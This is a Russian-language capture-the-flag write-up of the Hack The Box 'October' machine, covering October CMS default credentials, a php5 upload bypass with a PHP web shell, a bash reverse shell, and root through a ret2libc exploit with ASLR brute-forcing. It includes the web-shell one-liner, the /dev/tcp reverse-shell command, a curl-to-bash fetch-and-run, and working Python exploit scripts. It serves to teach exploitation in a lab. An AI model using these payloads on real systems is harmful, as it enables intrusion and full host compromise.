---
layout: post
title: "В королевстве PWN. Обходим DEP и брутфорсим ASLR в «Октябре»"
date: 2019-11-08 18:00:00 +0300
author: snovvcrash
categories: /pentest
tags: [xakepru, write-up, hackthebox, machine, pwn-32, linux, october-cms, default-credentials, searchsploit, php5-upload, python-simple-http, suid-files, buffer-overflow, stack-smashing, dep-bypass, ret2libc, aslr-bypass, aslr-bruteforce]
comments: true
published: true
---

[//]: # (2019-10-08)

**October** — относительно несложная виртуальная машина с Hack The Box, однако на ее примере удобнее всего разобрать, что, в сущности, из себя представляют: атака ret2libc, применяемая для обхода запрета выполнения данных (DEP/NX-Bit) в стеке; и подбор необходимого адреса той самой стандартной разделяемой библиотеки libc для нивелирования рандомизации размещения адресного пространства (ASLR). Ко всему прочему, на общий уровень сложности повлиял челлендж с захватом админки CMS, где случайно оставили дефолтную авторизацию, поэтому быстро пробежим вступление и более подробно остановимся на этапе privilege escalation.

<!--cut-->

Машину для нового прохождения я подбирал, основываясь не только на ее названии (октябрь же!), но и на специфике предлагаемых ею испытаний — низкоуровневая эксплуатация, что отлично подходит для текущий серии статей.

В этот раз нас ждут:

* исследование October CMS;
* получение веб-шелла и разведка на хосте с целью выявления уязвимого бинарника;
* комбинация атаки «ret2libc + брутфорс ASLR» для получения сессии суперпользователя.

> В королевстве PWN
> 
> В этом цикле статей **срыв стека** бескомпромиссно правит бал:
> 
> 1. [Препарируем классику переполнения стека](https://snovvcrash.github.io/2019/10/20/classic-stack-overflow.html)
> 2. **➤**{:.green} [Обходим DEP и брутфорсим ASLR в «Октябре»](https://snovvcrash.github.io/2019/11/08/htb-october.html)
> 3. [ROP-цепочки и атака Return-to-PLT в CTF Bitterman](https://snovvcrash.github.io/2019/11/23/bitterman.html)
> 4. [Return-to-bss, криптооракулы и реверс-инжиниринг против Великого Сокрушителя](https://snovvcrash.github.io/2019/12/20/htb-smasher.html)

<p align="right">
    <a href="https://xakep.ru/2019/10/08/hackthebox-dep-aslr/"><img src="https://img.shields.io/badge/%5d%5b-xakep.ru-red?style=flat-square" alt="xakep-badge.svg" /></a>
    <a href="https://www.hackthebox.eu/home/machines/profile/15"><img src="https://img.shields.io/badge/%e2%98%90-hackthebox.eu-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
    <span class="score-medium">4.7/10</span>
</p>

![banner.png](/assets/images/pwn-kingdom/october/banner.png)
{:.center-image}

![info.png](/assets/images/pwn-kingdom/october/info.png)
{:.center-image}

* TOC
{:toc}

[*Приложения*](https://github.com/snovvcrash/xakepru/tree/master/pwn-kingdom/2-htb-october)

# Разведка

## Nmap

На этот раз я немного изменю свою стандартную тактику использования Nmap и попробую новый трюк.

```
root@kali:~# nmap -n -Pn --min-rate=1000 -T4 -p- 10.10.10.16 -vvv | tee ports
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 19:01 EDT
Initiating SYN Stealth Scan at 19:01
Scanning 10.10.10.16 [65535 ports]
Discovered open port 22/tcp on 10.10.10.16
Discovered open port 80/tcp on 10.10.10.16
SYN Stealth Scan Timing: About 25.97% done; ETC: 19:03 (0:01:28 remaining)
SYN Stealth Scan Timing: About 60.13% done; ETC: 19:03 (0:00:40 remaining)
Completed SYN Stealth Scan at 19:03, 90.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.16
Host is up, received user-set (0.081s latency).
Scanned at 2019-09-23 19:01:57 EDT for 90s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 90.52 seconds
           Raw packets sent: 131135 (5.770MB) | Rcvd: 69 (3.036KB)
```

Первым действием я на высокой скорости (опции `--min-rate=1000`, `-T4`) просканирую весь диапазон портов хоста October. Запросив максимально подробный фидбек от Nmap (тройным `-vvv`), я перенаправлю вывод в файл `ports` с помощью tee, но в то же время смогу видеть промежуточные результаты и прогресс выполнения до завершения работы сканера.

```
root@kali:~# ports=$(cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//')
root@kali:~# echo $ports
22,80
```

После чего, вооружившись текстовыми процессорами командной строки Linux и паттернами регулярных выражений, я вытащу все порты из результата сканирования, сформирую из них строку, в которой номера портов разделены запятой, и присвою ее значение переменной `$ports`. Если магия работы с парсингом файла `ports` кажется неинтуитивной, попробуй по частям разобрать приведенный однострочник, с каждым разом прибавляя следующий конвеерный оператор и команду, следующую за ним.

```
root@kali:~# nmap -n -Pn -sV -sC --reason -oA nmap/october -p$ports 10.10.10.16
root@kali:~# cat nmap/october.nmap
# Nmap 7.80 scan initiated Mon Sep 23 19:04:21 2019 as: nmap -n -Pn -sV -sC --reason -oA nmap/october -p22,80 10.10.10.16
Nmap scan report for 10.10.10.16
Host is up, received user-set (0.080s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 23 19:04:31 2019 -- 1 IP address (1 host up) scanned in 10.19 seconds
```

Завершающим действием я вызову Nmap с переменной `$ports`, хранящей отсортированный список найденных портов, в качестве значения опции `-p`. Флаг `--reason` служит для того, чтобы сканер мог аргументированно «объяснить», на основании каких данных он сделал тот или иной вывод относительно статуса доступности каждого порта. Эти доводы можно наблюдать в появившейся колонке `REASON`.

Судя по баннеру, который «слил» демон SSH, и дате релиза машины на HTB, это Ubuntu 14.04.

В силу отсутствия какой-либо другой очевидной информации идем проверять, что творится на вебе.

# Веб — порт 80

На `http://10.10.10.16:80` тебя встретит сервер Apache с системой управления содержимым October CMS (тема — Vanilla).

[![browser-index.png](/assets/images/pwn-kingdom/october/browser-index.png)](/assets/images/pwn-kingdom/october/browser-index.png)
{:.center-image}

На первой ссылке поисковика по запросу, как попасть в панель админа, тебя встретит заботливый [ответ](https://octobercms.com/forum/post/how-do-i-access-the-backend) форумчан самой CMS'ки: просто добавь `/backend` в адресную строку.

[![browser-backend.png](/assets/images/pwn-kingdom/october/browser-backend.png)](/assets/images/pwn-kingdom/october/browser-backend.png)
{:.center-image}

Оказавшись в админке, недолго думая, я попробовал стандартные `admin:admin`.

[![browser-admin-upload.png](/assets/images/pwn-kingdom/october/browser-admin-upload.png)](/assets/images/pwn-kingdom/october/browser-admin-upload.png)
{:.center-image}

И вот уже я внутри панели управления.

Вопросив searchsploit о существующих [уязвимостях](https://www.exploit-db.com/exploits/41936) October CMS, я нашел способ загрузки веб-шелла — виной был неполный черный список расширений потенциально уязвимых файлов, в котором отсутствовало упоминание об `php5`.

```
==================== source start ========================
106 <?php
107 protected function blockedExtensions()
108 {
109         return [
110                 // redacted
111                 'php',
112                 'php3',
113                 'php4',
114                 'phtml',
115                 // redacted
116         ];
117 }
====================  source end  ========================
```

Также на это намекал уже существующий php5-скрипт в библиотеке. Поэтому я нажал Upload и загрузил самый банальный бэкдор, который смог придумать.

```
root@kali:~# echo '<?php system($_REQUEST["cmd"]); ?>' > backdoor.php5
```

[![browser-admin-backdoor.png](/assets/images/pwn-kingdom/october/browser-admin-backdoor.png)](/assets/images/pwn-kingdom/october/browser-admin-backdoor.png)
{:.center-image}

Теперь я могу инициировать выполнение команд от имени `www-data`, обратившись к загруженному файлу с аргументом `cmd`.

[![browser-admin-rce.png](/assets/images/pwn-kingdom/october/browser-admin-rce.png)](/assets/images/pwn-kingdom/october/browser-admin-rce.png)
{:.center-image}

## Реверс-шелл

Раз у меня есть RCE, ничто не помешает мне получить шелл. Сделаю я это из Burp Suite для наглядности, прописав в качестве пейлоада [реверс-шелл](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) на Bash по TCP (мой IP — `10.10.14.15`, порт — `31337`).

```
bash -c 'bash -i >& /dev/tcp/10.10.14.15/31337 0>&1'
```

[![burp.png](/assets/images/pwn-kingdom/october/burp.png)](/assets/images/pwn-kingdom/october/burp.png)
{:.center-image}

После отправки запроса можно ловить отклик на netcat.

[![nc-listen.png](/assets/images/pwn-kingdom/october/nc-listen.png)](/assets/images/pwn-kingdom/october/nc-listen.png)
{:.center-image}

Став обладателем грубого шелла, я апгрейдил его до удобного интерактивного PTY-терминала, как [делился](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312) этим когда-то на форуме Hack The Box.

[![nc-upgrade-pty.png](/assets/images/pwn-kingdom/october/nc-upgrade-pty.png)](/assets/images/pwn-kingdom/october/nc-upgrade-pty.png)
{:.center-image}

Таким образом я оказался внутри машины и начал осматриваться вокруг.

[![user-txt.png](/assets/images/pwn-kingdom/october/user-txt.png)](/assets/images/pwn-kingdom/october/user-txt.png)
{:.center-image}

### LinEnum

Одним из наиболее удобных инструментов для сбора информации внутри хоста я считаю [LinEnum](https://github.com/rebootuser/LinEnum). Этот написанный на Bash скрипт покажет всю стратегически важную информацию о системе в простом текстовом формате прямо «здесь и сейчас» — большего нам и не нужно!

Для переброса файлов на машину-жертву удобно пользоваться функционалом простого HTTP-Python-сервера.

Создай временную папку на своем хосте, скопируй в нее скрипт и запусти сервер командой `python -m SimpleHTTPServer 8888` (для Python 2) или `python3 -m http.server 8888` (для Python 3). После этого ты сможешь обратиться к содержимому временной папки с другого хоста в этой сети. Обрати внимание, что все, кто знает нужный IP-адрес и порт, на котором поднят сервер, может получить доступ к чтению файлов внутри корневой директории, поэтому рекомендую создавать именно **отдельную** папку, в которой нет чувствительной информации (а Path Traversal питоновский сервер не подвержен).

Чтобы не оставлять лишних следов на атакуемой машине, скрипт можно выполнить без непосредственного его сохранения на диск — просто выдерни его со своего севера с помощью `curl` и передай на исполнение интерпретатору через пайп.

```
$ curl -s http://10.10.14.15:8888/LinEnum.h | bash -s -- -t
```

С помощью флага `-s` и следующего после него разделителя `--` можно передавать параметры для самого скрипта — в данном случае `-t` [означает](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh#L20) провести более глубокое сканирование.

Некоторые другие быстрые решения для трансфера файлов, обладающие большим функционалом, я рассматривал [здесь](https://snovvcrash.github.io/2018/10/11/simple-http-servers.html).

Из обширного вывода LinEnum первым, что бросается глаза, оказалась секция с исполняемыми файлами, для которых установлен SUID-бит.

[![linenum-sh.png](/assets/images/pwn-kingdom/october/linenum-sh.png)](/assets/images/pwn-kingdom/october/linenum-sh.png)
{:.center-image}

Внимание привлек нестандартный файл `/usr/local/bin/ovrflw`, владельцем которого является root. Взглянем на него поближе.

### ovrflw

[![ovrflw-glance.png](/assets/images/pwn-kingdom/october/ovrflw-glance.png)](/assets/images/pwn-kingdom/october/ovrflw-glance.png)
{:.center-image}

```
www-data@october:/usr/local/bin$ file ovrflw
ovrflw: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped
```

После поверхностного анализа оказалось, что:

1. Это динамически скомпонованный 32-битный исполняемый файл.
2. Он требует строку в качестве аргумента.
3. При использовании строки большой длины, программа крашится с ошибкой сегментирования.

Учтя подозрительное название файла, делаем вывод в пользу того, что, скорее всего, этот бинарник уязвим к переполнению буфера.

Прежде чем отправить `ovrflw` к себе на машину для последующего анализа, выясним, активен ли механизм [ASLR](https://ru.wikipedia.org/wiki/ASLR) на ВМ October. Это можно сделать любым из удобных способов: можно проверить значение файла `/proc/sys/kernel/randomize_va_space`, либо воспользоваться скриптом `ldd`, который покажет адреса загрузки разделяемых библиотек, линкованных с файлом.

[![october-check-aslr.png](/assets/images/pwn-kingdom/october/october-check-aslr.png)](/assets/images/pwn-kingdom/october/october-check-aslr.png)
{:.center-image}

Значение `2` в `randomize_va_space` означает, что активен режим полной рандомизации (к слову, `1` символизирует «умеренную» рандомизацию — ASLR работает только для разделяемых библиотек, стека, `mmap()`, vDSO и позиционно-независимых файлов; `0` — все в статике), а команда `ldd ovrflw | grep libc`, выполненная в цикле 20 раз, при каждом запуске показывает новый адрес загрузки.

Не рекомендуется использовать `ldd` для анализа исполняемых файлов, которым ты не доверяешь. Это следует из специфики работы скрипта: в большинстве случаев для извлечения требуемой информации `ldd` просто запускает бинарник с рядом предварительно установленных переменных окружения, которые делают возможным отслеживание загруженных в память объектов, взаимодействующих с анализируемым файлом.

Посмотрим информацию о ядре.

```
www-data@october:/usr/local/bin$ uname -a
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux
```

Конфигурация ВМ близка к конфигурации стенда, который я использовал в [предыдущей части](https://snovvcrash.github.io/2019/10/20/classic-stack-overflow.html#компиляция) серии, поэтому перетащим исполняемый файл на локальную машину (закодировав его `base64`, к примеру, и скопировав, как текст) и посмотрим, с какими еще механизмами безопасности нам предстоит столкнуться.

# Анализ ovrflw в искусственных условиях

Переместившись на Ubuntu [16.04.6](https://ubuntu.com/download/alternative-downloads) (i686), запустим программу из-под отладчика.

[![ovrflw-checksec.png](/assets/images/pwn-kingdom/october/ovrflw-checksec.png)](/assets/images/pwn-kingdom/october/ovrflw-checksec.png)
{:.center-image}

Помимо рандомизации адресного пространства, которую придется обходить в боевых условиях на машине-жертве, нам придется обмануть механизм [предотвращения выполнения данных](https://ru.wikipedia.org/wiki/Предотвращение_выполнения_данных) (DEP, Data Execution Prevention), об активности которого символизирует [NX-Bit](https://ru.wikipedia.org/wiki/NX_bit).

Убедиться в этом можно также с помощью анализа заголовков `ovrflw` утилитой `readelf` с флагом `-l`.

[![ovrflw-readelf.png](/assets/images/pwn-kingdom/october/ovrflw-readelf.png)](/assets/images/pwn-kingdom/october/ovrflw-readelf.png)
{:.center-image}

Сегмент стека содержит только флаги `RW` (Read-Write), но не `E` (Exec).

Ассемблерный листинг функции `main` не сильно отличается от тех примеров, которые мы рассматривали при [анализе](https://snovvcrash.github.io/2019/10/20/classic-stack-overflow.html#ассемблер) классического переполнения буфера за исключением того, что здесь появился дополнительный код, отвечающий за проверку факта передачи программе аргумента и аварийного завершения последней, если это не произошло.

[![ovrflw-assembly.png](/assets/images/pwn-kingdom/october/ovrflw-assembly.png)](/assets/images/pwn-kingdom/october/ovrflw-assembly.png)
{:.center-image}

## Обход DEP — ret2libc

Будем последовательны и для начала справимся с нейтрализацией NX, отключив на время ASLR на локальной машине.

```
$ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

Убедимся в том, что адрес библиотеки `libc.so` статичен.

[![localhost-check-aslr.png](/assets/images/pwn-kingdom/october/localhost-check-aslr.png)](/assets/images/pwn-kingdom/october/localhost-check-aslr.png)
{:.center-image}

Значение памяти загрузки либы неизменно, поэтому можно приступать.

Кстати, GDB с установленным PEDA позволяет провести такую проверку в одну команду.

```
gdb-peda$ aslr
ASLR is OFF
```

### Теория

В случае, когда у тебя нет возможности выполнить шелл-код прямо в стеке, на помощь приходит [атака возврата в стандартную библиотеку](https://ru.wikipedia.org/wiki/Атака_возврата_в_библиотеку) или ret2libc. Суть ее проста: вместо того, чтобы подменять адрес возврата адресом внедренного на стек вредоноса, тебе нужно перезаписать сохраненное значение EIP на адрес функции из арсенала стандартной библиотеки языка C, которую ты хотел бы вызвать. Подскажу: вызвать бы ты хотел, разумеется, функцию `system`, которая позволяет выполнять команды ОС.

Автор одного из гайдов по переполнению буфера удачно сравнил атаку ret2libc со сценой выбора оружия из первой части кинотрилогии «Матрица», в которой оператор по просьбе Нео загружает в симулятор комнату с бесконечным арсеналом. Разумеется, в нашем случае арсенал конечен (в силу конечности библиотеки `libc`), однако метафора близка.

> *(Оператор)* — Итак, что вам нужно? Кроме чуда...
>
> *(Нео)* — Оружие. Много оружия.

Ссылка на статью: [Binary Exploitation ELI5 – Part 1](https://hackernoon.com/binary-exploitation-eli5-part-1-9bc23855a3d8), глава 0x05 — Attack: ret2libc.

Для того, чтобы лучше понимать концепцию атаки, нарисуем пару картинок.

Как меняется стек в ходе эпилога любой функции?

[![stack-layout-leave-ret.png](/assets/images/pwn-kingdom/october/stack-layout-leave-ret.png)](/assets/images/pwn-kingdom/october/stack-layout-leave-ret.png)
{:.center-image}

1. После выполнения инструкции `leave` (которая, как ты помнишь, разворачивается в `mov esp,ebp; pop ebp`) стек примет состояние, изображенное слева: ESP будет указывать на адрес возврата в вызывающую функцию, а значение EBP восстановится на значение EBP вызывающего.
2. После выполнения инструкции `ret` (которая грубо говоря выполняет действие, похожее на `pop eip`) стек примет состояние, изображенное справа: ESP станет указывать на значение, которым заканчивался стек перед выполнением `call`, стековый фрейм вызываемой функции будет окончательно удален, а вызывающий вскоре займется очисткой оставшегося мусора в виде уже переданных аргументов.

Так себя ведет «правильный» эпилог.

Чтобы провести атаку ret2libc и добиться выполнения функции `system` с последующим корректным завершения работы программы, тебе нужно, чтобы стек принял следующий вид **перед** тем, как будет достигнут финальный `ret` уязвимой функции.

[![stack-layout-ret2libc.png](/assets/images/pwn-kingdom/october/stack-layout-ret2libc.png)](/assets/images/pwn-kingdom/october/stack-layout-ret2libc.png)
{:.center-image}

1. Локальные переменные уязвимой функции должны быть заполнены «мусором», чтобы добраться до адреса возврата.
2. Адрес возврата (сохраненное значение EIP) следует перезаписать адресом функции `system` из библиотеки `libc`.
3. После этого в стек нужно поместить значение адреса функции `exit` (также из библиотеки `libc`), чтобы программа не крашнулась при завершении работы функции `system` (это опционально, и на это место может быть передано случайное значение, но так аккуратнее).
4. В конце пейлоада необходимо разместить аргумент для функции `system` — обычно это строка `"/bin/sh"`, которая впоследствии превратится в командную оболочку.

Таким образом, перетасовав стек, мы искусственно воссоздали условия для успешного вызова функции из `libc`, а именно:

* притворились вызывающей функцией и разместили в стеке аргумент (строку `"/bin/sh"`) для вызываемой функции `system`;
* притворились инструкцией `call` и разместили квази-адрес-возврата (который в сущности является адресом функции `exit`);
* перезаписали оригинальное сохраненное значение EIP адресом функции `system`.

Насколько элегантна данная методика: находясь в крайней точке стекового кадра, нарушитель разрабатывает эксплоит, который повторяет задом наперед действия компилятора и заставляет последний непреднамеренно выполнить нужную функцию инструкцией `ret`, но не `call`!

Перейдем к практике и посмотрим, как реализовать эту стратегию для нашего случая.

### Практика

Первым делом выясним размер буфера, который нужно, собственно, переполнить.

Я сгенерирую и передам уникальный паттерн из 200 байт, а после расчитаю точку перезаписи адреса возврата по текущему значению регистра EIP.

[![gdb-ovrflw-eip-offset.png](/assets/images/pwn-kingdom/october/gdb-ovrflw-eip-offset.png)](/assets/images/pwn-kingdom/october/gdb-ovrflw-eip-offset.png)
{:.center-image}

```
gdb-peda$ pattern offset 0x41384141
1094205761 found at offset: 112
```

Итак, перезапись EIP начинается с 112 байта. Запомним это.

Теперь нам нужно получить четыре ключевых значения:

1. Адрес загрузки библиотеки `libc`.
2. Величины смещений относительно базового адреса `libc` до библиотечных функций `system` и `exit`.
3. Величину смещения относительно базового адреса `libc` до строки `"/bin/sh"`.

Сделать это можно не одним способом, и я продемонстрирую по два возможных варианта на каждый пункт.

#### 1. Адрес загрузки libc

Первый вариант получения адреса загрузки библиотеки `libc` уже был рассмотрен ранее — просто воспользоваться шелл-скриптом `ldd`.

```
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e09000)
```

Адрес `libc.so.6` — `0xb7e09000`.

Другой способ заключается в обращении к файловой системе procfs с целью получения отображения памяти, используемой процессом `ovrflw`. Для этого «заморозим» выполнение программы в GDB и запросим маппинг памяти.

```
gdb-peda$ b main      # break main
gdb-peda$ r           # run
gdb-peda$ i proc map  # info proc mappings
```

[![gdb-ovrflw-maps.png](/assets/images/pwn-kingdom/october/gdb-ovrflw-maps.png)](/assets/images/pwn-kingdom/october/gdb-ovrflw-maps.png)
{:.center-image}

В этом случае по тому же адресу загрузится библиотека `libc-2.23.so` (а не `libc.so.6`), используемая GDB и содержащая дополнительную отладочную информацию. Однако общий смысл остается неизменным.

Эти же данные можно получить из файла `/proc/<ovrflw_PID>/maps`.

[![procfs-ovrflw-maps.png](/assets/images/pwn-kingdom/october/procfs-ovrflw-maps.png)](/assets/images/pwn-kingdom/october/procfs-ovrflw-maps.png)
{:.center-image}

#### 2. Смещения до функций system и exit

Величины смещений функций относительно базового адреса `libc` можно запросить с помощью утилиты `readelf`, примененной к самой библиотеке с флагом `-s` (отображает [таблицу символов](https://ru.wikipedia.org/wiki/Таблица_символов) запрошенного файла).

```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e ' system@' -e ' exit@'
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Выбрав интересующую нас информацию по ключевым словам ` system@` и ` exit@`, мы получили два значения смещения: `0x0003ada0` для `system` и `0x0002e9d0` для `exit`.

Альтернативным подходом к получению адресов требуемых функций является использование команды `print` отладчика GDB. Загрузив `ovrflw` для отладки, аналогично просмотру маппинга памяти выставим точку останова на `main`, запустим программу и вытащим нужные нам адреса.

```
gdb-peda$ b main
gdb-peda$ r
gdb-peda$ p system  # print system
$1 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
gdb-peda$ p exit    # print exit
$2 = {<text variable, no debug info>} 0xb7e379d0 <__GI_exit>
```

Замечу, что в данном случае мы получили абсолютные значения адресов функций `system` и `exit` (`0xb7e43da0`, `0xb7e379d0` соответственно), а не их относительные смещения.

#### 3. Смещение до строки "/bin/sh"

Если речь идет о поиске строк в Linux, очевидно, не обойдется без утилиты `strings`.

```
$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
 15ba0b /bin/sh
```

Флаг `-a` необходим для поиска по всему файлу, а `-t x` задает формат вывода адреса (16-ричный в нашем случае).

Другим способом получения адреса `"/bin/sh"` станет поиск «в лоб».

В классическом GDB такой поиск осуществляется командой `find`.

```
(gdb) b main
(gdb) r
(gdb) find 0xb7e09000, +9999999, "/bin/sh"
0xb7f64a0b
warning: Unable to access 16000 bytes of target memory at 0xb7fbe793, halting search.
1 pattern found.
(gdb) x/s 0xb7f64a0b
0xb7f64a0b:     "/bin/sh"
```

Здесь я указываю начальный адрес для поиска, максимальное смещение относительно него и паттерн, который нужно найти. После чего командой анализа содержимого (`x/s`) убеждаюсь, что по адресу `0xb7f64a0b` действительно находится строка `"/bin/sh"`.

Однако ассистент PEDA предлагает более сподручный поиск строк с помощью встроенной Python-команды `searchmem`.

```
gdb-peda$ b main
gdb-peda$ r
gdb-peda$ searchmem '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f64a0b ("/bin/sh")
```

В этом случае я получаю нужный результат в одно действие.

#### Эксплоит

Теперь у тебя есть все, чтобы оформить эксплоит на Python.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit_no_aslr.py

import struct
from subprocess import call


def little_endian(num):
	"""Упаковка адреса в формат little endian."""
	return struct.pack('<I', num)


junk = "A" * 112            # мусор

libc_addr = 0xb7e09000      # базовый адрес libc

system_offset = 0x0003ada0  # смещение функции system
exit_offset = 0x0002e9d0    # смещение функции exit
sh_offset = 0x0015ba0b      # смещение строки "/bin/sh"

system_addr = little_endian(libc_addr + system_offset)
exit_addr = little_endian(libc_addr + exit_offset)
sh_addr = little_endian(libc_addr + sh_offset)

payload = junk + system_addr + exit_addr + sh_addr

call(['./ovrflw', payload])
```

[![exploit_no_aslr-py.png](/assets/images/pwn-kingdom/october/exploit_no_aslr-py.png)](/assets/images/pwn-kingdom/october/exploit_no_aslr-py.png)
{:.center-image}

Таким образом, мы обошли защиту от выполнения кода в стеке. Сама по себе защита DEP не может помешать проведению атаки ret2libc, т. к. в данном случае мы задействуем уже существующий в адресном пространстве машинный код. Для усложнения проведения эксплуатаций подобного рода применяется технология рандомизация размещения адресного пространства ASLR, благодаря которой адрес загрузки стандартной библиотеки в память меняется с каждым вызовом программы. Для 64-битных архитектур это решения и правда сильно затрудняет жизнь «низкоуровневому» нарушителю, однако на 32-битных системах адрес `libc` вполне легко можно подобрать при условии отсутствия ограничений на количество разрешенных запусков уязвимого исполняемого файла.

## Обход ASLR — метод «грубой силы»

Активируем ASLR и взглянем на то, как меняются адреса загрузки `libc`, снова выполнив скрипт `ldd` в цикле.

```
$ sudo sh -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
```

[![aslr-changing-bytes-localhost.png](/assets/images/pwn-kingdom/october/aslr-changing-bytes-localhost.png)](/assets/images/pwn-kingdom/october/aslr-changing-bytes-localhost.png)
{:.center-image}

На моем стенде, равно как и на ВМ October, значительным изменениям подвергается всего **один байт** (3-й и 4-й разряды адреса, представленного в шестнадцатиричной записи, начиная отсчет с нуля) и **один бит** (в 5-м разряде, где мы видим всего два различных значения).

[![aslr-changing-bytes-pic.png](/assets/images/pwn-kingdom/october/aslr-changing-bytes-pic.png)](/assets/images/pwn-kingdom/october/aslr-changing-bytes-pic.png)
{:.center-image}

В квадратных скобках я отметил количество возможных вариантов для данной позиции исходя из размышлений выше. Следовательно, если я возьму наугад случайный адрес из тех 512 значений, которые могут «выпасть», то я получу шанс `1 - (511/512) ≈ 0.2%` угадать правильный адрес `libc`. Однако если я запущу тот же самый эксплоит 1000 раз, то мои шансы на успех повысятся до `1 - (511/512)^1000 ≈ 85.84%`, что звучит намного более оптимистично.

Модифицируем наш скрипт, обернув вызов программы в цикл.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit.py

import struct
from subprocess import call


def little_endian(num):
	"""Упаковка адреса в формат little endian."""
	return struct.pack('<I', num)


junk = "A" * 112            # мусор

libc_addr = 0xb7e09000      # базовый адрес libc

system_offset = 0x0003ada0  # смещение функции system
exit_offset = 0x0002e9d0    # смещение функции exit
sh_offset = 0x0015ba0b      # смещение строки "/bin/sh"

system_addr = little_endian(libc_addr + system_offset)
exit_addr = little_endian(libc_addr + exit_offset)
sh_addr = little_endian(libc_addr + sh_offset)

payload = junk + system_addr + exit_addr + sh_addr

for i in range(1, 1001):
	print 'Try: %s' % i
	call(['./ovrflw', payload])
```

После запуска перебора на 155-й попытке мне вернулся шелл.

[![exploit-py.png](/assets/images/pwn-kingdom/october/exploit-py.png)](/assets/images/pwn-kingdom/october/exploit-py.png)
{:.center-image}

# В боевых условиях

Снова переместившись в сессию на October, я выполню те же манипуляции для того, чтобы узнать необходимые мне значения адресов памяти.

[![october-get-addresses.png](/assets/images/pwn-kingdom/october/october-get-addresses.png)](/assets/images/pwn-kingdom/october/october-get-addresses.png)
{:.center-image}

И проведу эксплуатацию прямо из Bash.

[![october-ovrflw-pwn.png](/assets/images/pwn-kingdom/october/october-ovrflw-pwn.png)](/assets/images/pwn-kingdom/october/october-ovrflw-pwn.png)
{:.center-image}

Я ожидал, что перебор займет хотя бы несколько минут, но на шестой попытке уязвимый бинарь уже сдался.

> «Октябрь» горит, убийца плачет...

October пройден :triumph:

![trophy.png](/assets/images/pwn-kingdom/october/trophy.png)
{:.center-image}
